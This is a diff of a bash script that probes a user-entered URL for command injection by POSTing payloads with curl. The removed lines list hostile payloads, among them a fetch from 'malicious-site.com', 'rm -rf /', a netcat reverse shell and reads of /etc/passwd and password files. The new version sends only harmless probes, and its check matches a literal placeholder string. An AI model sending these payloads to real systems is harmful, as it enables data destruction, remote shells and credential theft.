@@ -1,46 +1,50 @@
 #!/bin/bash
 
-# Ask the user to input the target URL
-read -p "Enter the target URL (e.g., http://example.com/vulnerable_page.php): " TARGET_URL
+# Function to encode payload
+url_encode() {
+    printf '%s' "$1" | jq -sRr @uri
+}
 
-# List of payloads to inject
-PAYLOADS=(
-    "ls"
-    "id"
-    "whoami"
-    "uname -a"
-    "echo 'Hello, injected'"
-    "cat /etc/passwd"
-    "netstat -an"
-    "ifconfig"
-    "ping -c 4 127.0.0.1"
-    "curl http://malicious-site.com/malware"
-    "rm -rf /"
-    "mkdir malicious_directory"
-    "ls ../../../../"
-    "find / -type f -name 'password*'"
-    "echo 'Malicious data' >> /var/log/application.log"
-    "nc -nv 127.0.0.1 12345 -e /bin/bash"
-)
+# Function to test for command injection
+test_injection() {
+    local url=$1
+    # List of safer payloads to inject
+    local payloads=(
+        "uname -a"
+        "echo Hello"
+    )
 
-# Flag to track if any successful payload was found
-found=false
+    local found=false
 
-# Loop through each payload and test for command injection
-for payload in "${PAYLOADS[@]}"; do
-    # Send a POST request with payload as data
-    response=$(curl -s -X POST -d "input=$payload" "$TARGET_URL")
+    # Loop through each payload and test for command injection
+    for payload in "${payloads[@]}"; do
+        local encoded_payload=$(url_encode "$payload")
+        local response=$(curl -s -X POST --data-urlencode "input=$encoded_payload" "$url")
 
-    # Check if the response contains the payload
-    if [[ $response =~ $payload ]]; then
-        echo "Potential Command Injection found: Payload: $payload"
-        echo "Response: $response"
-        echo ""
-        found=true
+        # Check for a pattern in the response that indicates successful execution
+        if [[ $response =~ 'expected response pattern' ]]; then
+            echo "Potential Command Injection found: Payload: $payload"
+            echo "Response: $response"
+            echo ""
+            found=true
+        fi
+    done
+
+    # If no successful payloads were found
+    if ! $found; then
+        echo "No potential Command Injection vulnerabilities found."
+    fi
+}
+
+# Main loop to continuously prompt for URLs
+while true; do
+    echo "Enter the target URL (e.g., http://example.com/vulnerable_page.php):"
+    read -p "URL (or type 'exit' to quit): " TARGET_URL
+
+    if [[ "$TARGET_URL" == "exit" ]]; then
+        echo "Exiting..."
+        break
+    else
+        test_injection "$TARGET_URL"
     fi
 done
-
-# If no successful payloads were found
-if ! $found; then
-    echo "No potential Command Injection vulnerabilities found."
-fi
